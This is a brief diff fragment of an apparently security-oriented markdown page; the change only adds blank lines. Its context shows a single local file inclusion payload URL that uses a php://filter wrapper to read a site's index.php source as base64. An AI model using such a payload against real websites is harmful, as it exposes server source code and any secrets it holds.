@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:14.209961+00:00'
 ```powershell
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 ```
+
+
